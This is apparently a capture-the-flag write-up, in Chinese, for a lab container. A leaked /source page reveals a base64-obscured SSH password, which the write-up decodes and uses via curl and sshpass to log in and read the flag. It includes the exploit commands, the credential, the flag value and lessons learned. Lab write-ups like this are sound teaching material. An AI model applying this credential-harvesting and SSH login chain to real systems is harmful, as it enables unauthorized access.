## 题解

### 入口与指纹

容器暴露**两个端口**：`80`（Web）和 `22`（SSH）。这本身就是提示——Web 只是跳板。

`GET /` 返回 `Server Processes` 表格（`ps -aux` 的输出），每 5 秒自动刷新
（`<meta http-equiv="refresh" content="5">`）。

页面里只有一个链接：

```html
<a href="/source">source</a>
```

### 关键观察

**1. `/source` 直接给出应用源码，凭据明文在内。**

```python
def get_process_list():
    hostname = 'localhost'; port = 22
    username = 'pedro'
    password = base64.b64decode(b'ZWZ3QzY5RGtlMiE=').decode('utf-8') + '!'
    command = 'ps -aux'
```

解码：`base64("ZWZ3QzY5RGtlMiE=") = "efwC69Dke2!"`，再拼接一个 `!`：

```text
password = efwC69Dke2!!
```

**2. 进程表本身也印证了这条路径。**

```text
root   9  … python /app/app.py
root 105  … sshd: pedro [priv]
pedro 112 … sshd: pedro@notty
```

即 Web 应用是用 `pedro` 这个账号通过 SSH 登录本机执行 `ps` 的。

### 利用链

```bash
T=$(head -1 .target)          # 容器给出两个地址：<ip>:80 与 <ip>:22

# 1. 读源码拿凭据
curl -sS "http://$T:80/source" | grep -A2 password

# 2. 用凭据 SSH 登录
sshpass -p 'efwC69Dke2!!' ssh -o StrictHostKeyChecking=no pedro@"$T" \
  'cat ~/FLAG.txt'
```

（无 sshpass 时用 paramiko：`client.connect(host,22,'pedro','efwC69Dke2!!')`。）

```text
flag{d4c3a89c-71cf-4b14-a6a3-cecb5342bd10}
```

### flag 位置

`/home/pedro/FLAG.txt`（属于 `pedro`，**只有该用户可读**——
所以必须真的拿到 SSH 登录，不能只靠 Web 侧的文件读取）。

## 复盘

- **两个端口就是两条路。** 容器同时给 `:80` 和 `:22` 时，Web 上的信息泄露往往
  是为了拿 SSH 凭据；先看 Web 有没有源码/配置泄露。
- **`/source` 这类"给自己看源码"的端点是常客。** 判据是页面里有指向它的链接
  （本题的 `source` 链接），或者 404 页面里出现过 `__file__`。
- **base64 在源码里不是加密。** `base64.b64decode(...) + '!'` 这种写法，
  解码后还要注意**尾部拼接**，很容易少一个字符。
- **flag 权限决定了攻击路径。** `/home/pedro/FLAG.txt` 只对 `pedro` 可读，
  所以必须走 SSH；如果只想 Web 侧读文件，会一直失败。
- **进程表是"实现泄露"的免费来源。** 它显示了应用以哪个用户、用什么方式
  执行命令（`sshd: pedro@notty`），直接印证了源码里的凭据可用。
